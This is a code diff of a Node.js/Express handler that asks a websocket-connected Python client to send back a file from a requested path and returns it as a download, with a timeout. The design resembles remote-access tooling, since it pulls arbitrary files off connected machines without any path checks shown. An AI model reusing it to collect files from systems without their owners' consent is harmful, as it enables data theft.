@@ -115,22 +115,44 @@ const downloadFiles=async (clients, req, res = response) => {
     const clientId = req.params.id;
     const client = clients.get(clientId);
 
-  if (!path) return res.status(400).json({ error: "Falta 'path'" }, client);
-
-  try {
-    const response = await sendToPython({ get_files:path }, client);
-    console.log(response);
-    
-    if (response.content) {
-      const fileBuffer = Buffer.from(response.content, "base64");
-      res.setHeader("Content-Disposition", `attachment; filename=\"${response.filename}\"`);
-      res.send(fileBuffer);
-    } else {
-      res.status(404).json({ error: "Archivo no encontrado" });
+    if (!client || client.readyState !== 1) {
+        return res.status(404).json({ error: 'Cliente no conectado' });
     }
-  } catch (e) {
-    return res.status(500).json({ error: "Error descargando archivo" });
-  }
+
+    // Handler que se ejecuta al recibir mensaje del cliente Python
+    const msgHandler = (msg) => {
+        try {
+            const parsed = JSON.parse(msg);
+
+            // Validamos si llegó contenido base64
+            if (parsed.content) {
+                const fileBuffer = Buffer.from(parsed.content, "base64");
+                res.setHeader("Content-Disposition", `attachment; filename="${parsed.filename || "archivo.bin"}"`);
+                res.setHeader("Content-Type", "application/octet-stream");
+                res.send(fileBuffer);
+            } else {
+                res.status(404).json({ error: parsed.error || "Archivo no encontrado" });
+            }
+        } catch (e) {
+            res.status(500).json({ error: "Error procesando archivo" });
+        }
+
+        // Limpiamos el listener
+        client.off('message', msgHandler);
+    };
+
+    client.on('message', msgHandler);
+
+    // Enviar solicitud de archivo al cliente Python
+    client.send(JSON.stringify({ get_files: path }));
+
+    // Timeout para evitar dejar colgado el cliente si no responde
+    setTimeout(() => {
+        client.off('message', msgHandler);
+        if (!res.headersSent) {
+            res.status(504).json({ error: 'Timeout esperando respuesta del cliente' });
+        }
+    }, 5000);
 };
 
 
